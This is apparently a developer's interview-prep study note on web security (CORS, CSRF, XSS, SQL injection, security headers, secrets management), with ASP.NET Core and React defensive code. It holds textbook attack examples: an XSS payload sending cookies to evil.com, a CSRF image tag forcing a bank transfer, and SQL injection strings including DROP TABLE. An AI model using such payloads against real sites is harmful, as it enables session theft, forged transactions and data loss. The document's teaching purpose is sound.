# Web Security — CORS, CSRF, XSS & Beyond

## What it is
The practical attack vectors and defenses every backend + frontend developer must know. Beyond the OWASP top 10 checklist — understand *how* each attack works so you can reason about defenses.

## Why it matters
Security issues are asked at every level. Getting them wrong in a real app exposes your users. Interviewers test whether you understand the *why*, not just "use HTTPS."

---

## CORS — Cross-Origin Resource Sharing

### The Problem
Browsers block JavaScript from making requests to a **different origin** (protocol + domain + port) by default — this is the **Same-Origin Policy**.

```
https://app.com        → requests to → https://app.com/api    ✅ same origin
https://app.com        → requests to → https://api.other.com  ❌ blocked by browser
```

### How CORS Works

The browser adds an `Origin` header to cross-origin requests. The server must explicitly allow it.

**Simple request** (GET, POST with basic content types):
```
Browser → GET https://api.other.com/products
          Origin: https://app.com

Server  ← 200 OK
          Access-Control-Allow-Origin: https://app.com
```

**Preflight request** (PUT, DELETE, custom headers, JSON body):
```
Browser → OPTIONS https://api.other.com/products/1
          Origin: https://app.com
          Access-Control-Request-Method: DELETE
          Access-Control-Request-Headers: Authorization

Server  ← 204 No Content
          Access-Control-Allow-Origin: https://app.com
          Access-Control-Allow-Methods: GET, POST, PUT, DELETE
          Access-Control-Allow-Headers: Authorization, Content-Type
          Access-Control-Max-Age: 86400   ← cache preflight for 24h

Browser → DELETE https://api.other.com/products/1  ← actual request
```

### CORS in ASP.NET Core

```csharp
// Program.cs
builder.Services.AddCors(options =>
{
    options.AddPolicy("AllowFrontend", policy =>
        policy.WithOrigins("https://myapp.com", "https://www.myapp.com")
              .AllowAnyMethod()
              .AllowAnyHeader()
              .AllowCredentials()); // needed if sending cookies
});

// Apply BEFORE routing
app.UseCors("AllowFrontend");
app.UseAuthentication();
app.UseAuthorization();
```

**Never use `AllowAnyOrigin()` with `AllowCredentials()` — browsers reject this combination.**

### Key Points
- CORS is **browser-enforced only** — Postman and server-to-server calls ignore CORS
- `Access-Control-Allow-Origin: *` works for public APIs but prevents cookies from being sent
- Preflight is cached for `Access-Control-Max-Age` seconds — reduces latency

---

## CSRF — Cross-Site Request Forgery

### The Attack
Tricks an authenticated user's browser into sending an unwanted request to your site.

```
1. User is logged into bank.com — browser has session cookie
2. User visits evil.com (in another tab)
3. evil.com contains: <img src="https://bank.com/transfer?to=attacker&amount=1000">
4. Browser automatically sends the request WITH the bank.com cookie
5. Bank's server can't distinguish this from a legitimate request
```

### Why Bearer Tokens in Headers Are Immune
The browser only auto-sends **cookies** — it never automatically adds `Authorization: Bearer` headers. So token-in-header SPAs are not vulnerable to classic CSRF.

### Defenses

**1. SameSite Cookie Attribute (best modern defense):**
```csharp
// Program.cs
builder.Services.ConfigureApplicationCookie(options =>
{
    options.Cookie.SameSite = SameSiteMode.Strict; // never sent cross-site
    // or
    options.Cookie.SameSite = SameSiteMode.Lax;   // sent on top-level navigations only
    options.Cookie.HttpOnly = true;
    options.Cookie.SecurePolicy = CookieSecurePolicy.Always;
});
```

| SameSite Value | Sent on cross-site form POST | Sent on top-level navigation |
|---|---|---|
| `Strict` | No | No |
| `Lax` | No | Yes |
| `None` | Yes (requires Secure) | Yes |

**2. Anti-Forgery Tokens (ASP.NET Core built-in):**
```csharp
// In Razor Pages / MVC — automatic
@Html.AntiForgeryToken()

// In API controllers — validate manually
[ValidateAntiForgeryToken]
[HttpPost]
public IActionResult Submit(FormModel model) { }

// For APIs with SPA: use Double Submit Cookie pattern or request header token
```

**3. Check Origin/Referer headers (defense-in-depth):**
Reject requests where `Origin` or `Referer` doesn't match your domain.

---

## XSS — Cross-Site Scripting

### The Attack
Injecting malicious JavaScript into a page that other users see. The script runs in their browser with full access to the DOM, cookies, and local storage.

### Types

**Stored XSS:** Malicious script is saved to the database and shown to all users.
```
Attacker posts a comment: <script>fetch('https://evil.com?c='+document.cookie)</script>
Every user who views the comment executes this script
```

**Reflected XSS:** Script is in the URL, reflected back in the response.
```
https://shop.com/search?q=<script>...</script>
```

**DOM-based XSS:** Script is injected via DOM manipulation without going to the server.
```javascript
// Vulnerable code
document.getElementById('greeting').innerHTML = location.hash.slice(1);
// URL: https://app.com/#<img onerror="steal()">
```

### Why React Is Mostly Immune (but not fully)

React escapes all values before rendering:
```jsx
const userInput = '<script>alert("xss")</script>';
return <div>{userInput}</div>; // renders as text, not HTML — safe

// DANGEROUS — bypasses React's escaping
return <div dangerouslySetInnerHTML={{ __html: userInput }} />; // XSS!
```

Never use `dangerouslySetInnerHTML` with user-provided content.

### Defenses

**1. Output encoding** — always escape user data before rendering (React does this by default).

**2. Content Security Policy (CSP):**
```csharp
// In ASP.NET Core middleware
app.Use(async (context, next) =>
{
    context.Response.Headers.Add("Content-Security-Policy",
        "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'");
    await next();
});
```
CSP tells the browser to only execute scripts from trusted sources. Blocks injected scripts even if they get into the page.

**3. HttpOnly cookies** — XSS can't steal tokens stored in HttpOnly cookies (but can still make authenticated requests).

**4. Input validation** — validate and sanitize all input at system boundaries (API, forms).

**5. Never use `eval()`, `innerHTML` with user data, or `dangerouslySetInnerHTML`.**

---

## SQL Injection

### The Attack
User input is concatenated directly into a SQL query.

```csharp
// VULNERABLE — never do this
string query = $"SELECT * FROM Users WHERE Email = '{email}'";
// email = "' OR '1'='1" → returns ALL users
// email = "'; DROP TABLE Users;--" → destroys data
```

### Defense

**1. Parameterized queries:**
```csharp
// ADO.NET — always use parameters
var command = new SqlCommand("SELECT * FROM Users WHERE Email = @Email", conn);
command.Parameters.AddWithValue("@Email", email);

// Dapper — parameters are automatic
var user = await conn.QueryFirstOrDefaultAsync<User>(
    "SELECT * FROM Users WHERE Email = @Email",
    new { Email = email });
```

**2. EF Core — immune by default:**
```csharp
// EF Core parameterizes automatically
var user = await _context.Users
    .FirstOrDefaultAsync(u => u.Email == email, ct); // safe

// Raw SQL in EF Core — use FromSqlInterpolated, NOT FromSqlRaw with string concat
var users = _context.Users
    .FromSqlInterpolated($"SELECT * FROM Users WHERE Email = {email}"); // safe
    // NOT: .FromSqlRaw($"... WHERE Email = '{email}'") // UNSAFE
```

---

## Security Headers

Set these on every response:

```csharp
app.Use(async (context, next) =>
{
    var headers = context.Response.Headers;
    headers.Add("X-Content-Type-Options", "nosniff");         // prevent MIME sniffing
    headers.Add("X-Frame-Options", "DENY");                   // prevent clickjacking
    headers.Add("Referrer-Policy", "strict-origin-when-cross-origin");
    headers.Add("Permissions-Policy", "camera=(), microphone=()");
    headers.Add("Content-Security-Policy", "default-src 'self'");
    await next();
});
```

| Header | Purpose |
|---|---|
| `X-Content-Type-Options: nosniff` | Browser must use declared Content-Type |
| `X-Frame-Options: DENY` | Prevents your page being embedded in iframes (clickjacking) |
| `Strict-Transport-Security` | Force HTTPS for a period |
| `Content-Security-Policy` | Whitelist allowed script/style sources |
| `Referrer-Policy` | Control how much referrer info is sent |

---

## Secrets Management

Never hardcode secrets in source code.

```csharp
// LOCAL DEV — .NET User Secrets (not committed to git)
dotnet user-secrets init
dotnet user-secrets set "Jwt:Secret" "super-secret-key"

// In code — reads from configuration (works for all environments)
var secret = _config["Jwt:Secret"];

// PRODUCTION — environment variables or Azure Key Vault
// Azure Key Vault integration:
builder.Configuration.AddAzureKeyVault(
    new Uri($"https://{vaultName}.vault.azure.net/"),
    new DefaultAzureCredential());
```

**Rules:**
- Never commit `.env` files or `appsettings.Production.json` with real secrets
- Use `dotnet user-secrets` for local dev
- Use environment variables or a secrets manager for production
- Rotate secrets regularly

---

## Rate Limiting as Security

Prevent brute force and credential stuffing.

```csharp
// ASP.NET Core 7+ built-in rate limiting
builder.Services.AddRateLimiter(options =>
{
    options.AddFixedWindowLimiter("login", limiterOptions =>
    {
        limiterOptions.PermitLimit = 5;
        limiterOptions.Window = TimeSpan.FromMinutes(1);
        limiterOptions.QueueProcessingOrder = QueueProcessingOrder.OldestFirst;
    });
});

[HttpPost("login")]
[EnableRateLimiting("login")]
public async Task<IActionResult> Login(LoginRequest request) { }
```

---

## OWASP Top 10 Quick Reference (2021)

| Rank | Vulnerability | Your Defense |
|---|---|---|
| A01 | Broken Access Control | Authorize every endpoint; don't trust client-side checks |
| A02 | Cryptographic Failures | HTTPS everywhere; no MD5/SHA1 for passwords; bcrypt/Argon2 |
| A03 | Injection (SQL, XSS, etc.) | Parameterized queries; output encoding; CSP |
| A04 | Insecure Design | Threat model; defence-in-depth |
| A05 | Security Misconfiguration | Security headers; disable debug in production |
| A06 | Vulnerable Components | Keep NuGet/npm packages updated |
| A07 | Auth Failures | Strong passwords; rate limit login; HttpOnly cookies |
| A08 | Integrity Failures | Verify package checksums; signed JWTs |
| A09 | Logging Failures | Log security events; never log passwords/tokens |
| A10 | SSRF | Validate URLs; whitelist allowed domains for outbound requests |

---

## Common Interview Questions

1. What is CORS and why does the browser enforce it?
2. What is the difference between a simple and a preflight request?
3. How does CSRF work? Why are Bearer tokens immune?
4. What is `SameSite=Lax` on a cookie? What does it prevent?
5. What is the difference between stored and reflected XSS?
6. Why is React mostly safe from XSS? What can still be dangerous?
7. What is `HttpOnly` on a cookie? What does it prevent?
8. How does EF Core protect against SQL injection?

---

## Common Mistakes

- Using `AllowAnyOrigin()` with `AllowCredentials()` (browsers block this)
- Storing JWT in `localStorage` (XSS-accessible)
- Using `dangerouslySetInnerHTML` with user input
- Raw SQL string concatenation (use parameterized queries)
- Missing CORS preflight caching (`Access-Control-Max-Age`)
- Not setting `HttpOnly` and `Secure` on authentication cookies

---

## How It Connects

- CORS is configured before `UseAuthentication()` in the middleware pipeline
- CSRF defense with `SameSite` complements the `HttpOnly` + `Secure` cookie setup in `authentication.md`
- React's XSS protection is why RTK Query + JSX is safer than raw DOM manipulation
- EF Core's parameterization is why the Repository pattern with LINQ beats raw SQL strings
- Rate limiting combines with the circuit breaker pattern from `resilience.md`

---

## My Confidence Level
- `[ ]` CORS — how it works, preflight, ASP.NET Core setup
- `[ ]` CSRF — how the attack works, SameSite defense, anti-forgery tokens
- `[ ]` XSS — stored vs reflected vs DOM, React's protection, CSP
- `[ ]` SQL injection — parameterized queries, EF Core safety
- `[ ]` Security headers — X-Content-Type-Options, X-Frame-Options, CSP
- `[ ]` Secrets management — user secrets, env vars, Key Vault
- `[b]` OWASP Top 10 — high-level awareness

## My Notes
<!-- Personal notes -->
